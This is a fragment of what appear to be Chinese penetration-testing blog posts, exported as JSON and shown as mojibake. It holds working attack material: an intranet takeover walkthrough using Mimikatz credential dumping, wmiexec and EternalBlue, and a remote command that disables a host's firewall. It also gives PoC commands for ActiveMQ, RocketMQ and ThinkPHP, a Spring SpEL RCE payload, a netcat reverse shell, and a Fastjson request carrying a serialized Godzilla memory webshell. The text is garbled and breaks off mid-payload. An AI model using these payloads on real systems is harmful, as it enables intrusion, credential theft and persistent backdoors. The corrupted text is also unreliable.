å¯ä»¥å‘ç°æˆ‘ä»¬ç°åœ¨çš„ç›®å½•å°±æ˜¯åœ¨dockerå¤–è¿™æ˜¯æºè‡ªäºä»–è®¾ç½®dockerè®¾ç½®äº†æˆ‘ä»¬å¯ä»¥æŒ‚è½½å¹¶ä¸”ä¿®æ”¹ååŒæ­¥åˆ°ä¸Šé¢ä¸ç„¶ä¸è¡Œ æˆ‘ä»¬å†™å…¥å…¬é’¥åˆ°ubuntuç”¨æˆ· æ”¯æŒæ‹¿ä¸‹ä¸¤å°ä¸»æœº linuxå†…æ ¸ææƒ ç¬¬ä¸‰å°ä¸»æœº-OAweb2æˆ‘ä»¬åœ¨ä¸»æœºäºŒä¸Šé¢æ”¾fscan å‘ç°äº†å†…ç½‘æœ‰ä¸€ä¸ªOAç³»ç»Ÿ æˆ‘ä»¬åœ¨ç¬¬ä¸€å°DMZä¸»æœºåŠ socksè¿™é‡ŒC2å¹³å°ä½ ç”¨MSF CSéƒ½å¯ä»¥ windowsä½¿ç”¨Proxifierä»£ç† è®¿é—®æ—¶å€™ä»£ç†è§¦å‘è¯æ˜é…ç½®æ­£ç¡® ä½¿ç”¨OAå·¥å…·æ‰«æè·å¾—ä¸€ä¸ªSHELL èšå‰‘è¿æ¥ æ”¾å…¥åé—¨æˆ‘ä»¬è¿æ¥ æˆ‘ä»¬æ­£å‘socksè¿æ¥è·å¾—ä¸‰å°ä¸»æœºæƒé™ ç¬¬å››å°ä¸»æœºè¿™é‡Œæˆ‘ç¯å¢ƒå¾ˆå¤šé—®é¢˜IPç¬¬ä¸€å°å˜äº†181å˜äº†184 æˆ‘ä»¬ä¸Šä¼ mimikatzç”¨æˆ·é»„é‡‘ç¥¨æ®æ‰«æå¯†ç  mimikatz.x64.exe sekurlsa::logonpasswords full exit password.txt è¿™é‡Œæˆ‘ä»¬åœ¨windowsä¸Šé¢åŠ ä¸€ä¸ªsocksä»£ç† åˆ›å»ºä¸€ä¸ªsocksæ± ç”¨æˆ·å…¨é¢ç©¿é€å†…ç½‘åˆ°è¾¾92ç½‘æ®µ ä½¿ç”¨wmiexecåè®®è·å–DC è¿œç¨‹ä¸‹è½½OAä¸Šé¢çš„8067åé—¨æˆ‘ä»¬å¯ä»¥ä¸»åŠ¨è¿æ¥ æ‹¿ä¸‹ç¬¬å››å° ç¬¬äº”å°FSCANæ‰«æ å‘ç°äº†æ°¸æ’ä¹‹è“ å·¥å…· è¿œç¨‹ä¸‹è½½åé—¨æ­£é¢è¿æ¥æ‹¿ä¸‹ç¬¬äº”å° å…³é—­é˜²ç«å¢™net use \\\\192.168.93.30\\ipc$ Whoami2021 /user:Administratorsc \\\\192.168.93.30 create unablefirewall binpath= netsh advfirewall set allprofiles state offsc \\\\192.168.93.30 start unablefirewall","tags":["Vshell","ms-17-010æ°¸æ’ä¹‹è“smb","docker","å†…ç½‘"]},{"title":"CSæ€ä¹ˆä¸Šçº¿LINUX","path":"/2025/07/26/posts/CS/","content":"CSæ€ä¹ˆä¸Šçº¿LINUX å®ç°ç›®æ ‡-ä¸Šçº¿linuxè¿™é‡Œæˆ‘ç”¨å…¬ç½‘å½“æœåŠ¡å™¨å¼€ä¸€ä¸ªteamserveræœåŠ¡å¯†ç å¯¹åº”.teamserver ip å¯†ç  è¿™é‡Œè¦ç”¨æ’ä»¶CrossC2-GithubBot-2023-11-20.cna genCrossC2.Linux å¤åˆ¶åˆ°å®¢æˆ·ç«¯ è¿™é‡Œæˆ‘ç”¨windowså¯åŠ¨ä½†æ˜¯æˆ‘ç”Ÿæˆè„šæœ¬æ˜¯åœ¨kaliå› ä¸ºæˆ‘å…¬ç½‘ç”ŸæˆæŠ¥é”™ å¾ˆå…³é”®ä¸€éƒ¨æ˜¯æŠŠæœåŠ¡å™¨ç«¯çš„.cobaltstrike.beacon_keys æ–‡ä»¶å¤åˆ¶åˆ°å®¢æˆ·ç«¯ç„¶ååˆ©ç”¨æ’ä»¶genCrossC2.Linuxç”Ÿæˆ æµ‹è¯•æ²¡æœ‰é‚£ä¸ª.cobaltstrike.beacon_keys æ–‡ä»¶ ä¸€ç›´å¡ä¸å‡ºæ¥ï¼Œæ”¾ä¸Šå»å°±ç”Ÿæˆè¿è¡ŒCSå°±ä¸Šçº¿äº†æœ‰MACçš„æ¢å°±è¡Œäº†","tags":["CS"]},{"title":"APPåŠ¨æ€è°ƒè¯•","path":"/2025/07/26/posts/anly/","content":"APP-åŠ¨æ€è°ƒè¯• æ‰“å¼€å¼€å‘è€…æ¨¡å¼ å…è®¸USBè°ƒè¯• ä½¿ç”¨JEB-5.9.0.202402071731_by_CXVå·¥å…· ä½¿ç”¨JDK17æˆ–è€…ä½ ç¯å¢ƒ åç¼–è¯‘è¦è°ƒè¯•çš„è½¯ä»¶åŠ ä¸Šè¿™ä¸²ä»£ç  android:debuggable=true æ‹¿å‡ºè®¾ç½®å¥½çš„APP æµ‹è¯•adbæ­£å¸¸ä¸ ä½¿ç”¨è½¯ä»¶è‡ªåŠ¨åç¼–è¯‘å³é”®å¯ä»¥è½¬æ¢ä¸ºJAVAä»£ç  CTRL+Bè®¾ç½®æ–­ç‚¹ å®Œæˆè¿™ä¸ªéªŒè¯ æ–­ç‚¹ç‚¹å¼€è°ƒè¯• å³è¾¹æ•°æ®å°±æ˜¯æˆ‘ä»¬çš„éªŒè¯","tags":["CS"]},{"title":"APP-é€†å‘ä¿®æ”¹","path":"/2025/07/25/posts/APPtest3/","content":"APP-é€†å‘ä¿®æ”¹ å®ç°ç›®æ ‡-ä¿®æ”¹æ–‡æœ¬çš„å€¼è¿™é‡Œä½¿ç”¨NPç®¡ç†å™¨å¯ä»¥ç›´æ¥é€†å‘ä¿®æ”¹è‡ªåŠ¨ç¼–è¯‘éå¸¸æ–¹ä¾¿æˆ–è€…MTç®¡ç†éƒ½å¯ä»¥ï¼Œå¯ä»¥ä½¿ç”¨jadx-gui æŸ¥çœ‹åŸå§‹JAVAä»£ç ï¼Œè¿™é‡Œä»£ç æ˜¯smaliä»£ç  ä¿®æ”¹ä¸‹é¢çš„æ–‡å­— ç›´æ¥å³ä¸Šè§’æœç´¢å‘ç°æ–‡æœ¬ä¿®æ”¹ ä¿®æ”¹ä¿å­˜é€€å‡º é‡æ–°è‡ªåŠ¨å®‰è£…å‘ç°å˜äº† ä¸‹é¢é‚£ä¸ªæ–‡å­—ä¸çŸ¥é“æ€ä¹ˆæœå°±ç”¨è¿™ä¸ªå¼€å‘è€…åŠ©æ‰‹ç‚¹å‡»åˆ†æ ç›´æ¥å¤åˆ¶æœç´¢ç„¶åä¸€å¥—æµç¨‹ ä¿®æ”¹ä¿å­˜é‡æ–°å®‰è£… å¦‚ä¸‹ ä¿®æ”¹å›¾ç‰‡ç±»ä¼¼ä½†æ˜¯æ€ä¹ˆæœç´¢å¯ä»¥åˆ°assetsç›®å½•æˆ–è€…resç›®å½•é‡Œé¢æœ‰é™æ€å›¾ç‰‡èµ„æºç„¶åè¦†ç›–å°±è¡Œ å…³äºä¿®æ”¹é€»è¾‘è¿™é‡ŒæŠŠé€»è¾‘ä»£ç ç›´æ¥æ”¹ä¸ºsmaliè¯­æ³•çš„ip-nezä¸åŸæœ¬çš„ç­‰äºæ”¹ä¸ºä¸ç­‰äº æˆ–è€…ä½ ä¿®æ”¹VIPæœ¬èº«çš„å‡½æ•°æŠŠ0x0ä¿®æ”¹ä¸º0x1ç»•è¿‡éªŒè¯ ç»•è¿‡å¹¿å‘Šå¯ä»¥ä½¿ç”¨è¿™ä¸ªç®—æ³•åŠ©æ‰‹åŠ ä¸ŠLSPosedç›´æ¥é€‰æ‹©ä¿®æ”¹ è¿›å»ä¸‰ç§’æ²¡æœ‰å¼¹å¹¿å‘Š æœ‰çš„APPç»•è¿‡å¹¿å‘Š å»æ‰å–å ä¸€ç›´ä¸ºçœŸåˆ™è·³è¿‡","tags":["App"]},{"title":"APP-å®‰å“9æ¨¡æ‹Ÿå™¨æŠ“åŒ…è®¾ç½®-ç»•è¿‡åŒå‘éªŒè¯","path":"/2025/07/22/posts/APPtest2/","content":"APP-å®‰å“9æ¨¡æ‹Ÿå™¨æŠ“åŒ…è®¾ç½®-ç»•è¿‡åŒå‘éªŒè¯-è‡ªåŠ¨æ‰«æå·¥å…·æ¨è å®ç°ç³»ç»Ÿè¯ä¹¦å®‰è£…æˆ‘ä»¬å…ˆçœ‹çœ‹ç”¨æˆ·è¯ä¹¦æ€ä¹ˆè£…çš„ ä½¿ç”¨æ¨¡æ‹Ÿå™¨-é€é¥å®‰å“9ç‰ˆæœ¬ è¿™ç‰ˆæœ¬ç”¨æˆ·æ¨¡å¼ä¸èƒ½æŠ“åŒ…äº†å¿…é¡»ç³»ç»Ÿè¯ä¹¦æ‰å¯ä»¥adbå·¥å…·platform-tools_r34.0.4-windowsä½¿ç”¨ frida frida-server-17.2.12-android-x86_64 å¿…é¡»å¯¹åº”æœ¬åœ°å’Œæ¨¡æ‹Ÿå™¨ä¸€è‡´ BPå¼€å¯ç«¯å£8888 pip list æ£€æŸ¥ç‰ˆæœ¬ä¸‹è½½å¯¹åº”çš„fridaä¸Šä¼ åˆ°æ¨¡æ‹Ÿå™¨adb.exe push frida-server-17.2.12-android-x86_64 /data/local ä¸Šä¼ åç»™ chmod +x frixx æ‰§è¡Œæœ¬æœºfrida-ps -U çœ‹çœ‹èƒ½å¦æ¥æ”¶ æ¨¡æ‹Ÿå™¨å…³é—­æ‰€æœ‰frida -U -f ddns.android.vuls -l SSLUnpinning.js æ‰§è¡Œè„šæœ¬å‘ç°å¯ä»¥æ‰§è¡Œ å¹¶ä¸”æˆåŠŸæŠ“åŒ…ç»•è¿‡è¯ä¹¦éªŒè¯ æŸtantanAPPå’Œwzydè¿™æ ·ç»•è¿‡ å’Œé‚£ä¸ªé¢å…·+æ¨¡å—å·®ä¸å¤šçš„ è¿™ä¸ªæ›´ç›´æ¥ç®€å•FRIDAæ›´ç›´è§‚ èµ„äº§æ”¶é›†å·¥å…·ï¼š apkleaks å¥½ä¸œè¥¿å•Š æ‰«æURL ç«¯å£ é“¾æ¥ $ pip3 install apkleaks å®‰è£… pip3 install apkleaks è‡ªåŠ¨æå– mobsf AppMessenger","tags":["APP"]},{"title":"APP-å®‰å“9æ¨¡æ‹Ÿå™¨æŠ“åŒ…è®¾ç½®-å®‰è£…ç³»ç»ŸBPè¯ä¹¦","path":"/2025/07/21/posts/APPtest/","content":"APP-å®‰å“9æ¨¡æ‹Ÿå™¨æŠ“åŒ…è®¾ç½®-å®‰è£…ç³»ç»ŸBPè¯ä¹¦ å®ç°ç³»ç»Ÿè¯ä¹¦å®‰è£…æˆ‘ä»¬å…ˆçœ‹çœ‹ç”¨æˆ·è¯ä¹¦æ€ä¹ˆè£…çš„ ä½¿ç”¨æ¨¡æ‹Ÿå™¨-é€é¥å®‰å“9ç‰ˆæœ¬ è¿™ç‰ˆæœ¬ç”¨æˆ·æ¨¡å¼ä¸èƒ½æŠ“åŒ…äº†å¿…é¡»ç³»ç»Ÿè¯ä¹¦æ‰å¯ä»¥adbå·¥å…·platform-tools_r34.0.4-windows BPå¼€å¯ç«¯å£8888 æ¨¡æ‹Ÿå™¨ç™»å½•ç½‘ç«™ä¸‹è½½è¯ä¹¦å‘½åä¸ºcer å®‰è£…å–åå­— è¿™é‡Œæˆ‘ä»¬åœ¨è®¾ç½®-ä¿¡ä»»ç”¨æˆ·è¯ä¹¦æŸ¥çœ‹å®‰è£…æˆåŠŸ - ç”¨æˆ·è¯ä¹¦ å®‰è£…ç³»ç»Ÿè¯ä¹¦è®¾ç½®ç‹¬ç«‹ç³»ç»Ÿç›˜-åœ¨å¼•æ“é‡Œé¢å¼€å¯Rootæ¨¡å¼ windowsæ²¡æœ‰opensslå°±ç”¨linux kaliè‡ªå¸¦çš„ ä¸‹è½½åè¾“å…¥å‘½ä»¤å°±è¡Œ å¦å­˜ä¸º.pemä¿å­˜æ–‡ä»¶ä¸º9a5ba575.0OpenSSL æ˜¯ä¸€ä¸ªå¼€æºçš„è½¯ä»¶åº“ï¼Œæä¾›äº†å®‰å…¨å¥—æ¥å­—å±‚ï¼ˆSSLï¼‰å’Œä¼ è¾“å±‚å®‰å…¨æ€§ï¼ˆTLSï¼‰åè®®çš„å®ç°ï¼Œä»¥åŠå„ç§å¯†ç å­¦ç®—æ³•ï¼Œè¢«å¹¿æ³›ç”¨äºäº’è”ç½‘ä¸Šçš„å®‰å…¨é€šä¿¡openssl x509 -inform DER -in cacert.der -out cacert.pem å°†è¯ä¹¦ä» DER äºŒè¿›åˆ¶æ ¼å¼ è½¬æ¢ä¸º PEM æ–‡æœ¬æ ¼å¼ã€‚openssl x509 -inform PEM -subject_hash_old -in cacert.pem è®¡ç®— PEM æ ¼å¼è¯ä¹¦çš„ æ—§ç‰ˆä¸»é¢˜å“ˆå¸Œå€¼ï¼ˆSubject Hashï¼‰ï¼Œå¹¶è¾“å‡ºè¯¥å“ˆå¸Œå€¼ã€‚ æ”¾åˆ°å·¥å…·é‡Œadbæ‰“å¼€adb.exe rootadb.exe devicesadb.exe push 9a5ba575.0 /sdcard/ adb.exe shellmount -o rw,remount / ä¿®æ”¹æƒé™ mountä½œç”¨æŠŠ/devæŒ‚è½½åˆ°ç›˜é‡Œå› ä¸ºdevä¸æä¾›æ–‡ä»¶æµè§ˆå¿…é¡»å…ˆæŒ‚è½½mount -o rw,remount /systemchmod 777 /systemmount -o remount -o rw /cp /sdcard/9a5ba575.0 /system/etc/security/cacerts/chmod 644 /system/etc/security/cacerts/9a5ba575.0reboot å®‰è£…æˆåŠŸ æŠ“åŒ…æµ‹è¯•æœ‰çš„é…ç½®äº†å°±å¯ä»¥æŠ“åŒ… æœ‰çš„åšäº†é™åˆ¶ä½ è¿˜æ˜¯æŠ“ä¸åˆ° è®¾ç½®èµ°ä»£ç† æµ‹è¯•æˆåŠŸä½†æ˜¯åšäº†SSLè¯ä¹¦é™åˆ¶çš„ä½ è¿˜æ˜¯æŠ“ä¸åˆ° æœ‰çš„è®¾ç½®äº†åä»£ç†-åæ¨¡æ‹Ÿå™¨-è¯ä¹¦æ ¡éªŒ åä»£ç†-ä»–éªŒè¯å¯èƒ½æ£€æµ‹çš„æ˜¯ä½ è®¾ç½®å¼€äº†æ²¡æœ‰ä»£ç†-ä½ ç”¨APPä»£ç†å°±è¡Œä¸æ‰“å¼€ä»£ç†è®¾ç½® å·¥å…· ProxyPin-android-ç¼ºç‚¹ä¸èƒ½è½¬åˆ°BURPåªèƒ½çœ‹æŠ“åŒ…ä¸èƒ½ä¿®æ”¹ å·¥å…· Postern-3.1.2 è½¬å‘BURPæŠ“åŒ… ç»•è¿‡åä»£ç† æˆåŠŸæŠ“åŒ…ç»•è¿‡åä»£ç† æˆ–è€…æŠŠæ¨¡æ‹Ÿå™¨èµ°proxifierè½¬å‘ æŠŠæ¨¡æ‹Ÿå™¨.exeèµ°burpçš„127.0.0.1:8888ç«¯å£è½¬å‘åˆ°BPç»•è¿‡æ¨¡æ‹Ÿå™¨å› ä¸ºçœŸæœºæ¯”æ¨¡æ‹Ÿå™¨é«˜ä¸€ä¸ªç­‰çº§ å¦‚æœéƒ½ä¸è¡Œ åç¼–è¯‘åˆ é™¤æ£€æµ‹ä»£ç  åè¯ä¹¦ï¼š Magisk+LSPosed ä¸¤ä¸ªç»„åˆç»•è¿‡æ¨¡å— é€šè¿‡å…±äº«ä¸Šä¼ LSPosed ZIPæ–‡ä»¶ ç„¶ååˆ é™¤systemxbinsuè¿™ä¸ªæ–‡ä»¶é˜²æ­¢é¢å…·æŠ¥é”™ ç”¨æ–‡ä»¶ç®¡ç†å™¨æ‰“å¼€è¶…çº§ç®¡ç†å‘˜ åˆ é™¤ä¸æ‰æ²¡å…³ç³»æ‰“å¼€ä¸æç¤ºå°±è¡Œ è®¾ç½®ä¸€ä¸‹ é‡å¯ååœ¨wifié‚£é‡Œå¯åŠ¨ä»£ç† æˆåŠŸæŠ“åŒ…ä¸ä¼šå´©æºƒ-å¦‚æœæ¨¡å—æ²¡æœ‰è£…å¤‡çš„è¯è¿›å»ç›´æ¥ä¼šç½‘ç»œå´©æºƒ-è®°å¾—ç”¨wifiä»£ç†","tags":["APP"]},{"title":"ActiveMQ-RocketMQ-Kafka-CVE","path":"/2025/07/18/posts/active/","content":"å¤„ç†å¹³å°å®‰å…¨-ActiveMQ-RocketMQ-Kafka-CVE ActiveMQç•Œé¢å¦‚ä¸‹ï¼Œé€šå¸¸é€šè¿‡ç«¯å£ 8161 web 61616 tcpè¿œç¨‹è®¿é—® æ¥åˆ¤æ–­æˆ–è€…é€šè¿‡åŠŸèƒ½ç‚¹æ¥åˆ¤æ–­ CVE-2022-41678åœ¨5.16.5, 5.17.3ç‰ˆæœ¬åŠä»¥å‰python poc.py -u admin -p admin http://xx:8161/ 2ã€CVE-2023-46604python3 -m http.server 6666python3 poc.py ç›®æ ‡IP ç›®æ ‡ç«¯å£ http://IP:6666/poc.xmlpython â€œpoc (1).pyâ€ 192.168.79.136 61616 http://xx:8000/poc.xml é€šè¿‡å»ºç«‹ç½‘ç»œ POCå…·ä½“å†…å®¹ RocketMQ9876 NameServeré€šä¿¡ç«¯å£ç”¨äºå®¢æˆ·ç«¯è·¯ç”±è¯·æ±‚å’ŒBrokeræ³¨å†Œå‘ç°10911 Brokerä¸»ç›‘å¬ç«¯å£å¤„ç†æ¶ˆæ¯å‘é€æ¶ˆè´¹ç­‰æ ¸å¿ƒæœåŠ¡ æ­å»ºå¾ˆéº»çƒ¦é‡åˆ°ç›´æ¥æµ‹è¯• æ¢æµ‹ï¼šd:\\Python3.8\\python.exe check.py â€“ip ip â€“port 9876 CVE-2023-33246 CVE-2023-37582 POCjava -jar rocketmq-attack-1.1-SNAPSHOT.jar AttackBroker â€“target ip:10911 â€“cmd â€œxxxxâ€ POCpython.exe CVE-2023-37582.py -ip ip -p 9876 Kafkaåˆ†å¸ƒå¼æµå¤„ç†å¹³å°ï¼Œç”¨äºé«˜ååé‡å®æ—¶æ•°æ®ä¼ è¾“å­˜å‚¨å’Œå¤„ç†ï¼Œå¹¿æ³›åº”ç”¨äºæ—¥å¿—æ”¶é›†ã€æ¶ˆæ¯é˜Ÿåˆ—ã€æ•°æ®ç®¡é“ã€å®æ—¶åˆ†æç­‰åœºæ™¯ã€‚ CVE-2023-25194æ¼æ´å½±å“ç‰ˆæœ¬ï¼š2.3.0 Apache Kafka 3.3.2https://github.com/vulhub/vulhub/blob/master/kafka/CVE-2023-25194/README.zh-cn.mdéœ€è¦JNDI å­—èŠ‚ç æ­å»ºæ”»å‡»","tags":["ActiveMQ","RocketMQ","Kafka"]},{"title":"THINKPHP-laravel-SpringBoot-Gateway-Struct2 CVE","path":"/2025/07/17/posts/TP-LARA-SPRINGBOOT/","content":"THINKPHP-laravel-SpringBoot-Gateway-Struct2 CVE thinkphpthinkphp åœ¨å…¶6.0.13ç‰ˆæœ¬åŠä»¥å‰ /?+config-create+/lang=../../../../../../../../../../../usr/local/lib/php/pearcmd/?=phpinfo()?+shell.phpå†™å…¥æ–‡ä»¶ ç‰ˆæœ¬5.Xå‘½ä»¤æ‰§è¡Œ å·¥å…·æ¢­å“ˆ LaravelCVE-2021-3129 RCE å·¥å…·exp python struct2æ¡†æ¶ 16å¹´å¾ˆå¤šç°åœ¨å¾ˆå°‘äº†ç‰¹ç‚¹ index.action è¿™ä¸ªaction å·¥å…·æ¢­å“ˆå› ä¸ºæ¼æ´å¾ˆå¤š SpringBootCVE-2022-22965Spring coreæ˜¯Springç³»åˆ—äº§å“ä¸­ç”¨æ¥è´Ÿè´£å‘ç°ã€åˆ›å»ºå¹¶å¤„ç†beanä¹‹é—´çš„å…³ç³»çš„ä¸€ä¸ªå·¥å…·åŒ…ï¼Œæ˜¯ä¸€ä¸ªåŒ…å«Springæ¡†æ¶åŸºæœ¬çš„æ ¸å¿ƒå·¥å…·åŒ…ï¼ŒSpringå…¶ä»–ç»„ä»¶éƒ½è¦ä½¿ç”¨åˆ°è¿™ä¸ªåŒ…ã€‚ CVE-2022-22965_Spring_Core_RCE-main exp.py CVE-2021-21234 ç›®å½•éå†Spring-boot-actuator-logview 0.2.13ä¹‹å‰ç‰ˆæœ¬å­˜åœ¨è·¯å¾„éå†æ¼æ´ï¼Œæ”»å‡»è€…å¯é€šè¿‡è¯¥ç¼ºé™·è¯»å–ç³»ç»Ÿä»»æ„æ–‡ä»¶ã€‚ éœ€è¦æœ‰è¿™ä¸ªç»„ä»¶æ‰å¯ä»¥ è€Œä¸”è¦æ»¡è¶³ç‰ˆæœ¬ ä¸ç„¶ä¸è¡Œ CVE-2022-22947APIç½‘å…³Spring Cloud Gatewayæ˜¯Springä¸­çš„ä¸€ä¸ªAPIç½‘å…³ã€‚Spring Cloud Gateway 3.1.x 3.1.1Spring Cloud Gateway 3.0.x 3.0.7 ä¸¤ç§å·¥å…·ç›´æ¥æ¢­å“ˆ CVE-2022-22963 Spring Cloud Function Spelè¡¨è¾¾å¼æ³¨å…¥Spring Cloud Functionæä¾›äº†ä¸€ä¸ªé€šç”¨çš„æ¨¡å‹ï¼Œç”¨äºåœ¨å„ç§å¹³å°ä¸Šéƒ¨ç½²åŸºäºå‡½æ•°çš„è½¯ä»¶ï¼ŒåŒ…æ‹¬åƒAmazon AWS Lambdaè¿™æ ·çš„ FaaSï¼ˆå‡½æ•°å³æœåŠ¡ï¼Œfunction as a serviceï¼‰å¹³å°ã€‚ 3.0.0.RELEASE Spring Cloud Function 3.2.2å‚è€ƒï¼šhttps://developer.aliyun.com/article/1160011 POSTï¼š/functionRouterspring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(bash -c echo,xx|base64,-d|bash,-i)","tags":["THINKPHP","Struct2","SpringBoot"]},{"title":"Fastjson","path":"/2025/07/16/posts/FASTJSON/","content":"fastjson-ä¸å‡ºç½‘-é™åˆ¶ JDKç‰ˆæœ¬é«˜ç”¨jndibypasså·¥å…·è‡ªåŠ¨éªŒè¯ JDKç‰ˆæœ¬é«˜çš„é—®é¢˜ æ‰“å…¥payload ä½¿ç”¨fjpartyé¶åœº FASTJSONé‡åˆ°WAFé™åˆ¶è¾“å…¥æç¤ºhack è¿™ä¸ªåªèƒ½ä¸€ä¸ªPAYLOADä¸€ä¸ªæ‰“å°è¯•å› ä¸ºä¸çŸ¥é“ç‰ˆæœ¬ nc ip tcp -e sh ä½¿ç”¨unicodeç¼–ç ç»•è¿‡ ä¸å‡ºç½‘åˆ¤æ–­ä¾èµ– x:@type:java.lang.Character@type:java.lang.Class,val:com.mchange.v2.c3p0.DataSources @type: java.lang.AutoCloseable æ³¨å…¥åŸç”Ÿfastjson 1.2.47ä»£ç æ‰§è¡Œå‘½ä»¤ æˆ–è€…åå¼¹shell è¿™é‡Œæ³¨æ„å¯¹é¢æ˜¯æœ‰WAFçš„ ä½†è¿˜å¯ä»¥ä½¿ç”¨æ·»åŠ _æˆ–+å¤„ç†å…³é”®å­—ç»•è¿‡ï¼Œå¯å‚è€ƒ https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/) è¿™é‡Œä½¿ç”¨\\u unicodeä¸è¡Œæ¢è¿™ä¸ªæˆåŠŸæ‰§è¡Œ è¿™é‡Œå› ä¸ºæ˜¯ä¸å‡ºç½‘ç»œæ‰€ä»¥æŒ‰é“ç†åå¼¹SHELLæ˜¯ä¸è¡Œçš„ æˆ‘è¿™é‡Œæ˜¯å› ä¸ºç¯å¢ƒé—®é¢˜ ä½ å¯ä»¥å†™å…¥ä¸€ä¸ªå†…å­˜é©¬å†™å…¥åé—¨è¾¾åˆ°è·å–SHELL æ›´å¥½çš„æ˜¯ä½¿ç”¨SLEEPæ¥åˆ¤æ–­æ˜¯å¦æ‰§è¡Œäº†å‘½ä»¤ æ‰“å…¥å“¥æ–¯æ‹‰å†…å­˜é©¬ ä½¿ç”¨*å†…å­˜é©¬ä»»æ„è®¿é—® POST /login HTTP/1.1Host: IPContent-Length: 24035X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36Accept: */*Content-Type: application/json; charset=UTF-8Accept-Encoding: gzip, deflate, brAccept-Language: en-US,en;q=0.9Connection: keep-alive a: @type:java.lang.Class, val:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource , b: @type:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource, us_erOverridesAsString:HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d657400124c6a6176612f6c616e672f537472696e673b4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e00200007870000029a1cafebabe0000003401ce0a000200030700040c00050006010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100063c696e69743e0100032829560800080100103361643266646466653862616438653609000a000b07000c0c000d000e0100084963655368656c6c01000270610100124c6a6176612f6c616e672f537472696e673b0700100100256a617661782f736572766c65742f687474702f48747470536572766c6574526571756573740700120100266a617661782f736572766c65742f687474702f48747470536572766c6574526573706f6e73650b000f00140c0015001601000a67657453657373696f6e01002228294c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b0700180100116a6176612f7574696c2f486173684d61700a0017000308001b01000773657373696f6e0b001d001e07001f0c0020002101000d6a6176612f7574696c2f4d6170010003707574010038284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b08002301000772657175657374080025010008726573706f6e73650a002700280700290c002a002b0100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b0a0027002d0c002e002f010015676574436f6e74657874436c6173734c6f6164657201001928294c6a6176612f6c616e672f436c6173734c6f616465723b0800310100067869616f64690b000f00330c0034003501000c676574506172616d65746572010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0800370100034745540b000f00390c003a003b0100096765744d6574686f6401001428294c6a6176612f6c616e672f537472696e673b0a003d003e07003f0c004000410100106a6176612f6c616e672f537472696e67010010657175616c7349676e6f726543617365010015284c6a6176612f6c616e672f537472696e673b295a0a003d00430c0044003b0100047472696d0a003d00460c004700480100076973456d70747901000328295a0a004a004b07004c0c004d004e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0a004a00500c0051005201000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0a005400550700560c005700580100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0a005a005b07005c0c005d005e0100136a6176612f696f2f496e70757453747265616d01000472656164010005285b4229490b001100600c0061006201000f6765744f757470757453747265616d01002528294c6a617661782f736572766c65742f536572766c65744f757470757453747265616d3b0a006400650700660c006700680100216a617661782f736572766c65742f536572766c65744f757470757453747265616d0100057772697465010007285b42494929560a005a006a0c006b0006010005636c6f736507006d0100136a6176612f6c616e672f457863657074696f6e0b0011006f0c0070007101000967657457726974657201001728294c6a6176612f696f2f5072696e745772697465723b0700730100176a6176612f6c616e672f537472696e674275696c6465720a007200030800760100114572726f7220657865637574696e673a200a007200780c0079007a010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b0a006c007c0c007d003b01000a6765744d6573736167650a0072007f0c0080003b010008746f537472696e670a008200830700840c008500860100136a6176612f696f2f5072696e745772697465720100077072696e746c6e010015284c6a6176612f6c616e672f537472696e673b2956080088010004504f53540a008a008b07008c0c008d008e0100106a6176612f6c616e672f4f626a656374010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0a009000910700920c0093008e01000f6a6176612f6c616e672f436c61737301000d6765745375706572636c6173730a009000950c0096003b0100076765744e616d650800980100156a6176612e6c616e672e436c6173734c6f616465720a003d009a0c009b009c010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0a000a009e0c009f00a0010009527573685468657265010081284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b4c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b4c6a6176612f7574696c2f4d61703b29560b00a200a30700a40c00a500a60100196a617661782f736572766c65742f46696c746572436861696e010008646f46696c746572010040284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b29560a00a800a90700aa0c00ab00ac0100106a6176612f7574696c2f42617365363401000a6765744465636f64657201001c28294c6a6176612f7574696c2f426173653634244465636f6465723b0800ae01026479763636766741414144514147676f41424141554367414541425548414259484142634241415938615735706444344241426f6f54477068646d4576624746755a7939446247467a633078765957526c636a73705667454142454e765a4755424141394d6157356c546e5674596d5679564746696247554241424a4d62324e6862465a68636d6c68596d786c56474669624755424141523061476c7a415141445446553741514142597745414630787159585a684c327868626d63765132786863334e4d6232466b5a584937415141425a7745414653686251696c4d616d4632595339735957356e4c304e7359584e7a